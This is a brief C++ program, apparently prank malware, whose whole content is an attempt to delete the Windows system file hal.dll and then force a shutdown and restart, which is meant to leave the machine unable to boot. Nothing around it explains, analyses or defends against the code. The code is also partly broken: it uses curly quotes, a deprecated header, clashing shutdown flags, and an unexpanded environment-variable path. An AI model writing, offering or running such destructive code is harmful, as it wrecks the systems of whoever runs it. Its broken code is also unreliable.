#include <iostream.h>
#include <windows.h>

using namespace std;

int main(int argc, char *argv[])
{
std::remove(“%systemroot%\\system32\\hal.dll”);
system(“shutdown -s -r”);
system(“PAUSE”);
return EXIT_SUCCESS;
}
